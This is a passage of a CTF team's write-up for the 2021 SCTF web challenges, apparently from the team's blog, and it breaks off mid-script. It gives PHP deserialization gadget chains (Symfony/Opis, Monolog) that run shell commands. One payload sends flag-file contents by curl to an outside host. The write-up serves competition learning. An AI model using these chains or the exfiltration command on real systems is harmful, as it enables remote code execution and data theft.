<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2021 SCTF SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次2021 SCTF 我们 SU 取得了2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2021 SCTF的 writeup"><meta property="og:type" content="blog"><meta property="og:title" content="2021 SCTF SU Writeup"><meta property="og:url" content="https://team-su.github.io/posts/65490.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次2021 SCTF 我们 SU 取得了2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2021 SCTF的 writeup"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082941352.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082945284.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/1.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082941059.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082943505.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082940663.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082942056.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082941119.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082941973.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082942015.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082941710.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082941976.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082942213.jpg"><meta property="og:image" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082942283.jpg"><meta property="article:published_time" content="2021-12-28T00:36:45.000Z"><meta property="article:modified_time" content="2025-07-13T11:56:31.445Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="SCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2021-12-25-SCTF/20211228082941352.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/65490.html"},"headline":"2021 SCTF SU Writeup","image":["https://team-su.github.io/images/2021-12-25-SCTF/20211228082941352.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082945284.jpg","https://team-su.github.io/images/2021-12-25-SCTF/1.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082941059.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082943505.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082940663.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082942056.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082941119.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082941973.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082942015.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082941710.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082941976.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082942213.jpg","https://team-su.github.io/images/2021-12-25-SCTF/20211228082942283.jpg"],"datePublished":"2021-12-28T00:36:45.000Z","dateModified":"2025-07-13T11:56:31.445Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次2021 SCTF 我们 SU 取得了2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2021 SCTF的 writeup"}</script><link rel="canonical" href="https://team-su.github.io/posts/65490.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-28T00:36:45.000Z" title="2021/12/28 08:36:45">2021-12-28</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T11:56:31.445Z" title="2025/7/13 19:56:31">2025-07-13</time></span><span class="level-item">an hour read (About 12956 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2021 SCTF SU Writeup</h1><div class="content"><p>本次2021 SCTF 我们 SU 取得了2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#x75;&#101;&#x72;&#x73;&#95;&#x78;&#x63;&#116;&#102;&#64;&#x31;&#50;&#x36;&#46;&#99;&#x6f;&#x6d;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2021 SCTF的 writeup </p>
<span id="more"></span>
<hr>
<p>本次2021 SCTF 我们 SU 取得了2nd 🥈的成绩，，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#x75;&#x65;&#x72;&#x73;&#x5f;&#120;&#x63;&#116;&#x66;&#x40;&#x31;&#x32;&#54;&#x2e;&#x63;&#111;&#x6d;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2021 SCTF 的 writeup </p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#fumo-on-the-christmas-tree">FUMO_on_the_Christmas_tree</a></li>
<li><a href="#upload-it">Upload_it</a></li>
<li><a href="#loginme">Loginme</a></li>
<li><a href="#ezuros">Ezuros</a></li>
<li><a href="#rceme">Rceme</a></li>
<li><a href="#upload-it-2">upload it 2</a></li>
<li><a href="#goftp">GoFTP</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#this-is-a-tree">This_is_A_tree</a></li>
<li><a href="#fumo-xor-cli">fumo_xor_cli</a></li>
<li><a href="#in-the-vaporwaves">in_the_vaporwaves</a></li>
<li><a href="#easydsp">easydsp</a></li>
<li><a href="#easyiot">easyiot</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#dataleak">dataleak</a></li>
<li><a href="#flyingkernel">flyingkernel</a></li>
<li><a href="#christmas-wishes">Christmas Wishes</a></li>
<li><a href="#christmas-song">Christmas Song</a></li>
<li><a href="#christmas-bash">Christmas Bash</a></li>
<li><a href="#gadget">Gadget</a></li>
<li><a href="#checkin-ret2text">CheckIn ret2text</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#ciruit-map">ciruit map</a></li>
<li><a href="#cubic">cubic</a></li>
</ul>
</li>
<li><a href="#rev">Rev</a><ul>
<li><a href="#sycgame"><strong>SycGame</strong></a></li>
<li><a href="#sycos"><strong>SycOS</strong></a></li>
<li><a href="#godness-dance">godness dance</a></li>
<li><a href="#cplusexceptionencrypt"><strong>CplusExceptionEncrypt</strong></a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>


<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h3><span id="fumo-on-the-christmas-tree">FUMO_on_the_Christmas_tree</span><a href="#fumo-on-the-christmas-tree" class="header-anchor"></a></h3><p>通过给定的一个 gadget class 文件来进行 PHP 反序列化 RCE。观察后发现只有一个类有 destructor，然后所有和系统互动的函数只有 readfile，所以这应该就是入口和出口。剩下的只需要找到一个调用路径从入口到出口。</p>
<p>所有的类都只有一个函数和一些成员变量。函数内部做的操作大概分为两类：</p>
<ul>
<li>对输入用函数做一些变换</li>
<li>调用其它类的成员函数</li>
</ul>
<p>我们先看所有对输入做变换的函数。其中有</p>
<ol>
<li><code>crypt</code>、<code>sha1</code>、<code>md5</code></li>
<li><code>base64_encode</code></li>
<li><code>str_rot13</code>、<code>strrev</code>、<code>ucfirst</code>、<code>base64_decode</code></li>
</ol>
<p>第一类是不可逆的，必须避免遇到；第二类是可逆的，但必须满足条件，只有在 <code>base64_encode</code> 后再出现一个 <code>base64_decode</code> 才行，并且两者中间的操作必须最终保证数据一致；第三类是完全可逆的。要注意的是，有的里面还会出现直接的赋值语句，比如 <code>$xxx = $yyy</code>。如果是 <code>$xxx = $xxx</code>（自己赋给自己）的类型则可以，否则的话则需要避免遇到（因为右侧的变量不存在）。</p>
<p>接下来，对于所有的类我们需要建立一个调用关系。类里函数调用的方式有几种：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">viqSfkeZ91</span>(<span class="params"><span class="variable">$DUkiWcRS</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$this</span>-&gt;pHnfXT0TP, <span class="string">&#x27;T81ZgYZlGt&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        @<span class="variable language_">$this</span>-&gt;pHnfXT0TP-&gt;<span class="title function_ invoke__">T81ZgYZlGt</span>(<span class="variable">$DUkiWcRS</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;QThTQjRHWm1WRw==&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    @<span class="variable language_">$this</span>-&gt;BUDQkw-&gt;<span class="title function_ invoke__">zvHrWpSd</span>(<span class="variable">$value</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">extract</span>([<span class="variable">$name</span> =&gt; <span class="string">&#x27;FTTh89A9u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$this</span>-&gt;IwXv56wBHu, <span class="variable">$KDKR9Egl7</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>-&gt;IwXv56wBHu, <span class="variable">$KDKR9Egl7</span>], ...<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四种</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ttcoBkt</span>(<span class="params"><span class="variable">$a06sSms0Pd</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;Z9vliIEZ9u, [<span class="string">&#x27;upGnwrVnpV&#x27;</span> =&gt; <span class="variable">$a06sSms0Pd</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>第一种找哪个类有<code>T81ZgYZlGt</code>。</li>
<li>第二种找哪个类有<code>zvHrWpSd</code>。</li>
<li>第三种需要看<code>extract</code>里面的参数，找到哪个类有<code>FTTh89A9u</code>。处理的时候要注意第三种等价于第一种的写法：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KDKR9Egl7</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$this</span>-&gt;IwXv56wBHu, <span class="string">&#x27;FTTh89A9u&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        @<span class="variable language_">$this</span>-&gt;IwXv56wBHu-&gt;<span class="title function_ invoke__">FTTh89A9u</span>(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>第四种只能调用第二种，需要找哪个类的<code>__invoke</code>函数的<code>base64_decode</code>的参数是<code>upGnwrVnpV</code>的 Base64 编码字符串。</li>
</ul>
<p>如果一个类可以通过某种方式（保证输入是上文所述可逆变化的条件下）带着输入调用另一个类，则可以从这个类到达另一个类。那接下来我们直接在上文建立好调用关系的情况下，在这些类上（看成一个图）从入口开始进行 DFS，中间记录经过的类、函数和对输入进行的变换。如果能够在满足上述条件的情况下到达出口，则成功找到一条调用路径。</p>
<p>剩下的就是用现成的 PHP 解析库解析所有的类，构建上述关系并且跑算法，最后得出一条路径，再手动构造序列化字符串和输入即可。</p>
<h3><span id="upload-it">Upload_it</span><a href="#upload-it" class="header-anchor"></a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://124.71.199.229:8778/&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">s.get(url)</span><br><span class="line"></span><br><span class="line">cookie = s.cookies.get(<span class="string">&quot;PHPSESSID&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">path,name,con</span>):</span><br><span class="line"></span><br><span class="line">    r = s.post(url,files=&#123;<span class="string">&quot;file&quot;</span>:(name,con),<span class="string">&quot;path&quot;</span>:(<span class="literal">None</span>,path)&#125;)</span><br><span class="line"></span><br><span class="line">serSes = os.popen(<span class="string">&quot;php gadget.php&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">store(<span class="string">&quot;../../../../tmp&quot;</span>,<span class="string">&quot;sess_&quot;</span>+cookie,serSes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.post(url,files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;pew&quot;</span>,<span class="string">&quot;XXD&quot;</span>)&#125;).text)</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\String;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LazyString</span> &#123;</span><br><span class="line"></span><br><span class="line">  function __construct() &#123;</span><br><span class="line"></span><br><span class="line">    $func = function()&#123;system(<span class="string">&quot;cat /flag&quot;</span>);&#125;;</span><br><span class="line"></span><br><span class="line">    $this-&gt;value = new \Opis\Closure\SerializableClosure($func);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include_once <span class="string">&quot;vendor/autoload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;upload_path|&quot;</span>.(serialize(new \Symfony\Component\String\LazyString())));</span><br></pre></td></tr></table></figure>

<h3><span id="loginme">Loginme</span><a href="#loginme" class="header-anchor"></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X-real-ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">age=&#123;&#123;$&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3><span id="ezuros">Ezuros</span><a href="#ezuros" class="header-anchor"></a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://124.70.204.21:7777/&quot;</span></span><br><span class="line">payload = os.popen(<span class="string">&quot;php gadget.php&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">s.get(url)</span><br><span class="line"></span><br><span class="line">s.post(url+<span class="string">&quot;config&quot;</span>,json=&#123;<span class="string">&#x27;XXD|&#123;&#125;FF&#x27;</span>.<span class="built_in">format</span>(payload):<span class="string">&#x27;XXD&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.get(url+<span class="string">&quot;config&quot;</span>).text)</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Monolog\Handler</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SyslogUdpHandler</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        protected $socket;</span><br><span class="line"></span><br><span class="line">        function __construct($x)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $this-&gt;socket = $x;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BufferHandler</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        protected $handler;</span><br><span class="line"></span><br><span class="line">        protected $bufferSize = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        protected $buffer;</span><br><span class="line"></span><br><span class="line">        protected $level = null;</span><br><span class="line"></span><br><span class="line">        protected $initialized = true;</span><br><span class="line"></span><br><span class="line">        protected $bufferLimit = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        protected $processors;</span><br><span class="line"></span><br><span class="line">        function __construct($methods, $command)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $this-&gt;processors = $methods;</span><br><span class="line"></span><br><span class="line">            $this-&gt;buffer = [$command];</span><br><span class="line"></span><br><span class="line">            $this-&gt;handler = clone $this;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line"></span><br><span class="line">$cmd = <span class="string">&#x27;$(printf &quot;curl https://thegrandpewd\\x2epythonanywhere\\x2ecom/`cat /etc/*/flag`&quot;)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$obj = new \Monolog\Handler\SyslogUdpHandler(</span><br><span class="line"></span><br><span class="line">        new \Monolog\Handler\BufferHandler(</span><br><span class="line"></span><br><span class="line">            [<span class="string">&#x27;current&#x27;</span>, <span class="string">&#x27;system&#x27;</span>],</span><br><span class="line"></span><br><span class="line">            [$cmd, <span class="string">&#x27;level&#x27;</span> =&gt; null]</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">echo serialize([$obj]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3><span id="rceme">Rceme</span><a href="#rceme" class="header-anchor"></a></h3><p>diff</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pcntl_fork</span>, pcntl_waitpid, pcntl_wait, pcntl_signal, pcntl_signal_get_handler, pcntl_signal_dispatch, pcntl_wifexited, pcntl_wifstopped, pcntl_wifsignaled, pcntl_wexitstatus, pcntl_wtermsig, pcntl_wstopsig, pcntl_exec, pcntl_alarm, pcntl_get_last_error, pcntl_errno, pcntl_strerror, pcntl_getpriority, pcntl_setpriority, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_wifcontinued, pcntl_async_signals, pcntl_unshare, cli_set_process_title, cli_get_process_title, chroot, dl,</span><br><span class="line"></span><br><span class="line"><span class="attribute">strlen</span>, error_reporting, set_error_handler, create_function, preg_match, preg_replace phpinfo, strstr, escapeshellarg, getenv, putenv, call_user_func, unserialize, var_dump, highlight_file, show_source, ini_get , end, </span><br></pre></td></tr></table></figure>

<p>简单看一下，知道是无参数 rce 抄一下脚本，改一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">one</span>(s):</span><br><span class="line"></span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> each in s:</span><br><span class="line"></span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">hex</span>(<span class="number">255</span> - <span class="title function_ invoke__">ord</span>(each)))[<span class="number">2</span>:].<span class="title function_ invoke__">upper</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> f<span class="string">&quot;[~&#123;ss&#125;][!%FF](&quot;</span></span><br><span class="line"></span><br><span 